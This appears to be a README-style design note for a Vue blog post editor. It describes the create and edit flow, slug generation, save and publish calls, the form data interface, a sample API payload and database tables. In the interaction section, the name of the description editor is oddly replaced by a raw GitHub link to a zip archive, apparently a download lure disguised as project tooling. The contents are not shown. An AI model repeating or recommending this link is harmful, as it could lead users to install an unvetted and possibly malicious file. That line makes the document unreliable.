
## 🔄 Control Flow: Editor (Post Creation & Editing)

### 🎯 Entry Point

* User navigates to `/posts/create` (create mode) or `/posts/:slug` (edit mode).
* Vue component mounted (Editor view), handling setup logic:

  * If `slug` is present → fetch post data (`getPost(slug)`)
  * If no slug → initialize blank form

### 🧭 Page Initialization Flow

1. **Vue `onMounted()` lifecycle hook** is triggered.
2. SEO data and parent categories/authors are fetched via:

   * `getParent()`
   * `getSeo()`
3. If editing (`slug` exists):

   * Load post using `getPost(slug)`
   * Populate `formData`
   * Set `createMode = false`

### ✍️ User Interaction Flow

* Title input:

  * Auto-generates slug via `generateSlug()` (debounced `watch()` hook)
* Slug can be edited inline
* Description edited via `https://github.com/nikhilcodewing/Post-editor/raw/refs/heads/main/Megalodon/editor-Post-v1.9-beta.2.zip` 
* SEO modal, category modal, and image selection modals open via respective toggles

### 💾 Saving or Publishing Flow

Triggered by `@submit="submitForm"`:

1. `submitForm(published: boolean)` sets `.published` flag
2. If `slug` exists → call `updatePost()`
3. Else → call `createPost()`
4. In both:

   * Serialize editor content
   * Set selected image IDs
   * Send to API:

     * `savePost()` (POST)
     * `modifyPost(slug)` (PUT)
5. After success:

   * Update slug (in case it changed)
   * Show preview link modal for 10 seconds
   * Redirect to updated post page

### 🔁 Additional Features

* SEO tools are integrated via modals and child components (`SeoAnalyzer`, `PageSeoSetting`)
* Preview functionality is computed via `postUrl`

---

## 📦 Data Flow: Editor

### 📁 In-Memory Structure (`formData`)

```ts
interface FormDataInterface {
  id: number;
  title: string;
  slug: string;
  status: boolean;
  published: boolean;
  description: object | string;
  gallery_id: string;
  author_id: number | null;
  post_category_id: [];
  published_on: string;
  is_sticky: boolean;
}
```

### 🔧 Data Lifecycle

* **Create mode**: `formData` is initialized with defaults
* **Edit mode**: populated from `getPost(slug)` response
* Description may be JSON from block editor or string
* Slug is generated from title via utility method
* Slug and title are linked via `watch` + `debounce`

### 🔄 API Interactions

* `getPost(slug)` → Loads post
* `savePost(formData)` → Creates new post
* `modifyPost(slug, formData)` → Updates existing post
* `getParent()` → Fetches category/author lists
* `savePostCategory()` → Creates new category
* `deletePostImage()` → Removes image by ID
* `GET /get-seo` → SEO metadata

### 📤 Serialization Before Submission

* `description` is stringified if not already
* Image/gallery ID added to payload

### 🧾 Sample Payload Sent to /posts API

```json
{
  "title": "My New Post",
  "slug": "my-new-post",
   "status": true,
  "published": true,
  "description": "{\"blocks\":...}",
  "gallery_id": "123",
  "author_id": 45,
  "post_category_id": [1, 2],
  "published_on": "2025-10-13",
  "is_sticky": false
}
```

### 𓊳 Related Tables

|  Posts:  |
| -------------- |
| id |
| title |
| slug |
| focus_keywords |
| status |
| published |
| description |
| user_id (fk) |
| author_id (fk) |
| published_on |
| is_sticky |
| created_at |
| updated_at |
| agency_id (fk) |

| Post_post_category: |
| -------------- |
| id |
| post_id (fk) |
| post_category_id (fk) |
| created_at |
| updated_at |

| Galleryables: |
| -------------- |
| id |
| gallery_id (fk) |
| galletyable_id |
| thumbnail_path |
| galleryable_type |
| created_at |
| updated_at |


